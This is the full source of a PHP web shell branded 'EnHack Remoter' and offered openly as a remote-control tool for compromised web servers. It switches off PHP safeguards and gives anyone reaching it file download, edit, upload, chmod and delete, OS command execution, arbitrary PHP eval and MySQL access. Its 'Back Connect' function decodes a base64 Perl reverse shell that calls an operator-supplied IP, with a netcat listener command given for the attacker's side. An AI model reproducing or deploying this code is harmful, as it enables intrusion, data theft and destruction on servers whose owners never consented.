<?php
/****************************************\
|* EnHack Remote Shell - wWw.EnHack.Net *|
|* Developed by EnHack Team             *|
|* Email: devteam@enhack.net            *|
\****************************************/

define( 'DS', DIRECTORY_SEPARATOR );

$ini_reconf = array(
	'display_errors' => '0',
	'disable_functions' => '',
	'file_uploads' => 'On',
	'max_execution_time' => '0',
	'memory_limit' => '1024M',
	'open_basedir' => '',
	'safe_mode' => 'Off',
	'sql.safe_mode' => 'Off',
	'upload_max_filesize' => '1024M',
);

foreach ($ini_reconf as $key => $value) {
	@ini_set($key, $value);
}

date_default_timezone_set('Asia/Ho_Chi_Minh');

function dectectos() {
	$curos = strtoupper(substr(PHP_OS, 0, 3));
	return $curos;
}

//File download
$fdownload=@$_GET['fdownload'];
if ($fdownload != "" ){
	if (file_exists($fdownload)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename='.basename($fdownload));
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
		header('Content-Length: ' . filesize($fdownload));
		ob_clean();
		flush();
		readfile($fdownload);
		exit;
	}
}
//PHP Info
function info()
{ ?>
	<div align="center" id="phpinfo">
	<?php
	ob_start () ;
	phpinfo () ;
	$pinfo = ob_get_contents () ;
	ob_end_clean () ;

	// the name attribute "module_Zend Optimizer" of an anker-tag is not xhtml valide, so replace it with "module_Zend_Optimizer"
	echo ( str_replace ( "module_Zend Optimizer", "module_Zend_Optimizer", preg_replace ( '%^.*<body>(.*)</body>.*$%ms', '$1', $pinfo ) ) ) ;
	?>
	</div>
<?php
}


//File Manager
function fileman()
{

	function getmode($par) {
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			return 'N/A';
		} else {
			$perms = fileperms($par);
			if (($perms & 0xC000) == 0xC000) {
				// Socket
				$info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
				// Symbolic Link
				$info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
				// Regular
				$info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
				// Block special
				$info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
				// Directory
				$info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
				// Character special
				$info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
				// FIFO pipe
				$info = 'p';
			} else {
				// Unknown
				$info = 'u';
			}
			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));
			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));
			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));

			return $info;
		}
	}

	function getowner($par) {
		if(function_exists('posix_getpwuid')) {
			$owner = @posix_getpwuid(@fileowner($par));
			return $owner['name'];
		}
	}

	function getgroup($par) {
		if(function_exists('posix_getgrgid')) {
			$group = @posix_getgrgid(@filegroup($par));
			return $group['name'];
		}
	}

	function getsize($par) {
		return @round(@filesize($par));
	}

	function byteConvert(&$bytes){
		$b = (int)$bytes;
		$s = array('  B', 'KB', 'MB', 'GB', 'TB');
		if($b < 0){
			return "0 ".$s[0];
		}
		$con = 1024;
		$e = (int)(log($b,$con));
		return number_format($b/pow($con,$e),2,',','.').' '.$s[$e];
	}

	$dir = realpath($_GET['dir']).DS;
	$list = scandir($dir);

	echo '
	<div align="center"><br>
	<form action="" method="GET">
		<input type="hidden" name="id" value="fm">
		<input type="text" name="dir" size="80" value="',$dir,'" class="input">&nbsp;
		<input type="submit" class="button" value=" Dir ">
	</form>
	</div>
	<div align="center">
	<table border="0" width="80%" cellspacing="1" cellpadding="2">
		<tr>
			<td width="180"><b><font size="2"> File / Folder Name </font></b></td>
			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Owner </b></font></td>
			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Group </b></font></td>
			<td width="50" align="center"><font color="#FFFFFF" size="2"><b> &nbsp;&nbsp;&nbsp;Size </b></font></td>
			<td width="30" align="center"><font color="#008000" size="2"><b> Download </b></font></td>
			<td width="30" align="center"><font color="#FF9933" size="2"><b> Edit </b></font></td>
			<td width="30" align="center"><font color="#999999" size="2"><b> Chmod </b></font></td>
			<td width="30" align="center"><font color="#FF0000" size="2"><b> Delete </b></font></td>
			<td width="150" align="center"><font color="#0080FF" size="2"><b> Last Modifed </b></font></td>
		</tr>';

for($i=0; $i<count($list); $i++) {
	if(@is_dir($dir.$list[$i])) {

		echo '
		<tr>
			<td><a href="?id=fm&dir=',$dir.$list[$i],'"><font color="#DD8008" size="2">',$list[$i],'</font></a></td>
			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
			<td align="center"></td>
			<td align="center"></td>
			<td align="center"></td>
			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
		</tr>';
	}
}

for($i=0; $i<count($list); $i++) {
	if(@is_file($dir.$list[$i])) {

		echo '
		<tr>
			<td><a href="?id=fedit&fedit=',$dir.$list[$i],'"><font color="#FFFFFF" size="2">',$list[$i],'</font></a></td>
			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
			<td align="right"><font color="#0080FF" size="2">',byteConvert(getsize($dir.$list[$i])),'</font></td>
			<td align="center">';
					if (@is_readable($dir.$list[$i])){
						echo '<a href="?id=fm&fdownload=',$dir.$list[$i],'"><font size="2" color="#008000"> Download </font></a>';
					} else {
						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
					}
			echo '</td>
			<td align="center">';
					if (@is_readable($dir.$list[$i])){
						echo '<a href="?id=fedit&fedit=',$dir.$list[$i],'"><font size="2" color="#FF9933"> Edit </font></a>';
					} else {
						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
					}
			echo '</td>
			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
		</tr>';
	}
}


	echo '
		<tr>
			<td valign="top" colspan="8">&nbsp;</td>
		</tr>
		<tr>
			<td valign="top" colspan="8">
				<form action="" method="GET">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File View / Edit:</td>
						<td width="80%">
							<input name="fedit" type="text" size="50" class="input" />&nbsp;
							<input type="hidden" name="id"  value="fedit">
							<input type="submit" value=" View / Edit " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form action="" method="GET">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File Download:</td>
						<td width="80%">
						<input name="fdownload" type="text" size="50" class="input" />&nbsp;
						<input type="submit" value=" Download " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form method="GET" action="">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">Chmod:</td>
						<td width="80%">
						<input type="text" name="fchmod" size="50" class="input" />&nbsp;
						<input type="text" name="mode" size="3" class="input" />&nbsp;
						<input type="submit" value=" Change " class="button" />
						</td>
					</tr>
				</table>
				</form>

				<form enctype="multipart/form-data" action="" method="POST">
				<table align="left" width="100%">
					<tr>
						<td width="20%" class="td">File Upload:</td>
						<td width="80%">
						<input name="userfile" type="file" size="50" class="file" />&nbsp;
						<input type="hidden" name="MAX_FILE_SIZE" value="300000"  />
						<input type="hidden" name="Fupath"  value="',$dir,'" />
						<input type="submit" value=" Upload " class="button" />
						</td>
					</tr>
				</table>
				</form>

				</div>
			</td>
		</tr>
	</table>';
}


//Default
function def()
{
	$id=$_GET['id'];
	if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
		$euserinfo  = @posix_getpwuid(@posix_geteuid());
	}
	if (function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
		$egroupinfo = @posix_getgrgid(@posix_getegid());
	}
	echo '
	<p align="center" style="padding-left:20px;">
	<a href="http://enhack.net"><img border="0" src="http://img143.imageshack.us/img143/4081/securemt9.png"></a><br>
	</p>
	<p align="left" style="padding-left:20px;">
	<font color="#DD8008" size="2"><b>OS : ',php_uname(),'
	<br>
	SERVER IP : <font color="#FF0000">',gethostbyname($_SERVER['SERVER_NAME']),'</font><br>
	SERVER NAME : <font color="#FF0000">',$_SERVER['SERVER_NAME'],'</font><br>
	SERVER SOFTWARE : <font color="#FF0000">',$_SERVER['SERVER_SOFTWARE'],'</font><br>
	SERVER ADMIN : <font color="#FF0000">',$_SERVER['SERVER_ADMIN'],'</font><br>
	uid = ',$euserinfo['uid'],' ( ',$euserinfo['name'],' ) &nbsp;&nbsp;&nbsp;&nbsp; gid = ',$egroupinfo['gid'],' ( ',$egroupinfo['name'],' )<br>
	</b></font></p>';
}


//Web Command
function wcom ()
{
	$cmd=$_POST['cmd'];
	$result=ex("$cmd");
	echo '<center><br><h3> Run Command </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="cmd" />
	<input type="text" size="85" name="cmd" value="',$cmd,'" class="input" />&nbsp;
	<input type="submit" class="button" value=" Run " />
	</form><br>
	<textarea rows=20 cols=85 class="textarea">',$result,'</textarea><br><br>';
}


//PHP Eval
function eeval()
{
	$code=stripslashes($_POST['code']);
	echo '<center><br><h3> PHP Code Evaluating </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="eval">
	<textarea name ="code" rows="10" cols="85" class="textarea">',$code,'</textarea><br><br>
	<input type="submit" value=" Evaluate PHP Code" class="button"><hr>
	</form>
	<textarea rows="10" cols="85" class="textarea">';
	eval($code);
	echo '</textarea><br><br>';
}


//Working with MySQL
function emysql()
{
	$cquery = $_POST['query'];
	$querys = @explode(';',$cquery);
	$dbhost = $_POST['dbhost']?$_POST['dbhost']:"localhost";
	$dbport = $_POST['dbport']?$_POST['dbport']:"3306";
	$dbuser = $_POST['dbuser'];
	$dbpass = $_POST['dbpass'];
	$dbname = $_POST['dbname'];
	if ($cquery  == "") {
		$cquery  = "-- SHOW DATABASES;\n-- SHOW TABLES FROM <database>;\n-- SHOW COLUMNS FROM <table>;";
	}
	echo '
	<center><h3> Working with MySQL </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="mysql">
	DBHost: <input type="text" size="8" name="dbhost" value="',$dbhost,'" class="input" />&nbsp;
	DBPort: <input type="text" size="5" name="dbport" value="',$dbport,'" class="input" />&nbsp;
	DBUser: <input type="text" size="10" name="dbuser" value="',$dbuser,'" class="input" />&nbsp;
	DBPass: <input type="text" size="10" name="dbpass" value="',$dbpass,'" class="input" />&nbsp;
	DBName: <input type="text" size="10" name="dbname" value="',$dbname,'" class="input" /><br><br>
	<textarea name ="query" rows="7" cols=90 class="textarea">',$cquery,'</textarea><br><br>
	<input type="submit" name="go" value="     Go     " class="button">
	</form>';
	if($_POST['go']) {
		$connect = @mysql_connect($dbhost.":".$dbport, $dbuser, $dbpass);

		if (!$connect)	{ echo '<textarea rows=3 cols=80 class="textarea">Could not connect: ',mysql_error(),'</textarea>';	}
		else {
			@mysql_select_db($dbname, $connect);
			echo '<div style="overflow:auto; height:400px;width:1000px;">';
			foreach($querys as $num=>$query){
				if(strlen($query)>5){
					echo '<font face=Verdana size=-2 color=orange><b>Query#'.$num.' : '.htmlspecialchars($query).'</b></font><br>';
					$res = @mysql_query($query,$connect);
					$error = @mysql_error($connect);
					if($error) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>'.$error.'</b></font></td></tr></table><br>'; }
					else {
						if (@mysql_num_rows($res) > 0){
							$sql2 = $sql = $keys = $values = '';
							while (($row = @mysql_fetch_assoc($res))){
								$keys = @implode('&nbsp;</b></font></td><td bgcolor=blue><font color=white face=Verdana size=-2><b>&nbsp;', @array_keys($row));
								$values = @array_values($row);
								foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
								$values = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;',$values);
								$sql2 .= '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
							}
							echo '<table width=100%>';
							$sql  = '<tr><td bgcolor=blue><font face=Verdana color=white size=-2><b>&nbsp;'.$keys.'&nbsp;</b></font></td></tr>';
							$sql .= $sql2;
							echo $sql;
							echo '</table><br>';
						}
						else { if(($rows = @mysql_affected_rows($connect))>=0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>'.$rows.'</b></font></td></tr></table><br>'; } }
					}
					@mysql_free_result($res);
				}
			}
			echo '</div><br>';
			@mysql_close($connect);
		}
	}
}


//Back Connect
function eback()
{
	$bc_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	echo '
	<p align="center"><font size="5"><b> Back Connecting </b></font></p>
	<p align="center"><font color="#DD8008">Run NetCat on your machine:</font><i><font color="#FF0000"> nc -l -p 1542</font></i>
	</p><br><hr><br><p align="center"><font color="#DD8008">Then input your IP and Port</font></p>
	<div align="center"><form method="POST" action="">
	<input type="text" name="pip" value="',$_SERVER['REMOTE_ADDR'],'" class="input" /> :
	<input type="text" name="pport" size="5" value="1542" class="input" /> <br><br>
	<input type="text" name="ppath" value="/tmp" class="input" /><br><br>
	<input type="submit" value=" Connect " class="button" />
	</form></div>';
	$pip=$_POST['pip'];		$pport=$_POST['pport'];
	if ($pip <> '') {
		$fp=fopen($_POST['ppath'].DS.rand(0,10).'bc_perl_enhack.pl', 'w');
		if (!$fp){
			$result = 'Error: couldn\'t write file to open socket connection';
		} else {
			@fputs($fp,@base64_decode($bc_perl));
			fclose($fp);
			$result = ex('perl '.$_POST['ppath'].'/bc_perl_enhack.pl '.$pip.' '.$pport.' &');
		}
	}
}


//File Edit
function fedit()
{
	$fedit=$_GET['fedit'];
	if(is_file($fedit)) {
		if ($fedit != "" ){
			$fedit=realpath($fedit);
			$lines = file($fedit);
			echo '
			<center><br><form action="" method="POST">
			<textarea name="savefile" rows="33" cols="100">' ;

			foreach ($lines as $line_num => $line) {
				echo htmlspecialchars($line);
			}
			echo '
			</textarea><br><br>
			<input type="text" name="filepath"  size="60" value="',$fedit,'" class="input" />&nbsp;
			<input type="submit" value=" Save " class="button" /></form>';
			$savefile=stripslashes($_POST['savefile']);
			$filepath=realpath($_POST['filepath']);
			if ($savefile <> "") {
				$fp=@fopen("$filepath","w+");
				if($fp){
					fwrite($fp,"") ;
					fwrite($fp,$savefile) ;
					fclose($fp);
					echo '<script language="javascript"> alert("File Saved!")</script>';
				} else {
					echo '<script language="javascript"> alert("Save Failed!")</script>';
				}
				echo '<script language="javascript"> window.location = "http://'.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'"</script>';
			}
			exit();
		}
	}
	else {
		echo '<u>',$fedit,'</u> is not file. <br />
		<a href="javascript:history.go(-1)"><-- back</a>
		';
	}
}


// Execute
function ex($param) {
	$res = '';
	if (!empty($param)){
		if(function_exists('exec'))	{
			@exec($param,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))	{
			$res = @shell_exec($param);
		}
		elseif(function_exists('system'))	{
			@ob_start();
			@system($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))	{
			@ob_start();
			@passthru($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f = @popen($param,"r")))	{
			$res = "";
			while(!@feof($f)) { $res .= @fread($f,1024); }
			@pclose($f);
		}
	}
	return $res;
}

//Upload File
$rpath=@$_POST['Fupath'];
if ($rpath <> "") {
	$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
		echo '<script language="javascript"> alert("\:D Upload successfully!")</script>';
	} else {
		echo '<script language="javascript"> alert("\:( Upload Failed!")</script>';
	}
}

//Delete file
$frpath=@$_GET['fdelete'];

function rmdirr($dirname)
{
    // Sanity check
    if (!file_exists($dirname)) {
        return false;
    }

    // Simple delete for a file
    if (is_file($dirname) || is_link($dirname)) {
        return unlink($dirname);
    }

    // Loop through the folder
    $dir = dir($dirname);
    while (false !== $entry = $dir->read()) {
        // Skip pointers
        if ($entry == '.' || $entry == '..') {
            continue;
        }

        // Recurse
        rmdirr($dirname . DIRECTORY_SEPARATOR . $entry);
    }

    // Clean up
    $dir->close();
    return rmdir($dirname);
}

if ($frpath <> "") {
	if(rmdirr($frpath)) {
		echo '<script language="javascript"> alert("Done! Press F5 to refresh")</script>';
	} else {
		echo '<script language="javascript"> alert("Fail! Press F5 to refresh")</script>';
	}
	echo '<script language="javascript"> history.back(2)</script>';
	exit(0);
}
?>

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>:: EnHack Remoter v3.4 ::</title>
<style>
<!--
body {
	font-family: Tahoma; font-size: 8pt; color:#00FF00;
	background-color:#000;
}
.td {
	font-size:80%;
}
a:link {
	text-decoration: none;
	color: #0080FF
}
a:visited {
	text-decoration: none;
	color: #0080FF
}
a:active {
	text-decoration: none;
	color: #0080FF
}
a:hover {
	text-decoration: underline overline;
	color: #FF0000
}

.input {
	border:  1px solid #0c9904 ;
	BACKGROUND-COLOR: #333333;
	font: 10pt tahoma;
	color: #ffffff;
}

.button {
	font-size: 13px;
	color:#0c9904;
	BACKGROUND-COLOR: #333333;
	border:  1px solid #0c9904;
}

.textarea {
	border:  1px solid #0c9904 ;
	BACKGROUND-COLOR: #333333;
	font: Fixedsys bold;
	color: #ffffff;
}

#phpinfo {
	width:80%;
	font-size:80%;
	padding-left10px;
}
#phpinfo table ,
#phpinfo td ,
#phpinfo tr {
	border:1px solid #9fe3a2;
}
#phpinfo pre {}
#phpinfo a:link {
	color:red;
}
#phpinfo a:hover {}
#phpinfo table {}
#phpinfo .center {}
#phpinfo .center table {}
#phpinfo .center th {}
#phpinfo td, th {}
#phpinfo h1 {
	font-size:120%;
}
#phpinfo h2 {
	text-decoration:underline;
	color:#75d584;
}
#phpinfo .p {
 font-size:90%;
 color:red;
}
#phpinfo .e {
	font-size:80%;
}
#phpinfo .h {
}
#phpinfo .v {
	font-size:75%;
	color:#3e9e25;
}
#phpinfo .vr {}
#phpinfo img {}
#phpinfo hr {}
-->
</style>
</head>

<body>
<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE);


// Change mode
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
	$fchmod=realpath($fchmod);
	echo '<center><font size="3"><br>
	Chang mode ',$fchmod,'<br>
	<form method="POST" action=""><br>
	<br>
	<input type="text" name="mode" size="4" class="input" />&nbsp;
	<input type="submit" value="chmod" class="button" />
	</form><br>';
	$mode=$_POST['mode'];
	if ($mode != ""){
		if(chmod($fchmod , $mode)) {
			echo "Successfully";
		} else {
			echo "Permission denied";
		}
	}
	echo '</font>';
	exit();
}
?>

<div align="center">
	<p align="center">
		<font face=Webdings size=10><b>!</b></font>
		<SPAN style="FONT-SIZE: 23pt; COLOR: #00CCFF; FONT-FAMILY: Impact">&nbsp;EnHack Remoter&nbsp;</SPAN>
		<font face=Webdings size=10><b>!</b></font>
		<br/>Released 17.05.2009
	</p>
	<table border="1" width="98%" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
		<tr>
			<td valign="top" rowspan="2">
				<p align="center"><b>
					<br><a href="?"><img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
				</p>
				<p align="center">=====[~]=====</p>
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=fm&dir=<?php	echo getcwd();	?>	">File Manager</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=cmd">Web Command</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=eval">PHP Evaluator</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=bcon">Back Connect</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=mysql">MySQL Query</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=info">Server Infos</a>
				</font></b></p>

				<p align="center">=====[~]=====</p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="mailto:jutoms@enhack.net" alt="Contact">Contact<br><br><img border="0" src="http://enhack.net/enhack.png"></a>
				</font></b></p>
			</td>
			<td valign="top" height="500" width="85%" style="border: 1px solid #0080FF" align="left">
			<?php
			// swich to function called base on id
			$cmdid = $_GET['id'];
			switch ($cmdid) {
				// File Manager
				case 'fm':
					fileman ();
					break;
				// Command Line
				case 'cmd':
					wcom();
					break;
				// PHP Eval
				case 'eval':
					eeval();
					break;
				// Work with MySQL
				case 'mysql':
					emysql();
					break;
				// Back connect
				case 'bcon':
					eback();
					break;
				// File Edit
				case 'fedit':
					fedit();
					break;
				// Php Info
				case 'info':
					info();
					break;
				// Default
				default: def();
			}
			//*******************************************************

			?>
			</td>
		</tr>
		<tr>
			<td style="border: 1px solid #0080FF">
			<p align="center">
			<font color="#FF0000" size="2"><b>:::::::::::::::: [ :: Copyright &copy 2008 - <a href="mailto:devteam@enhack.net">Developed</a> by <a href="http://enhack.net">EnHack Team</a> :: ] :::::::::::::::: </b></font>
			</p></td>
		</tr>
	</table>
</div>
</font>
</body>
</html>
			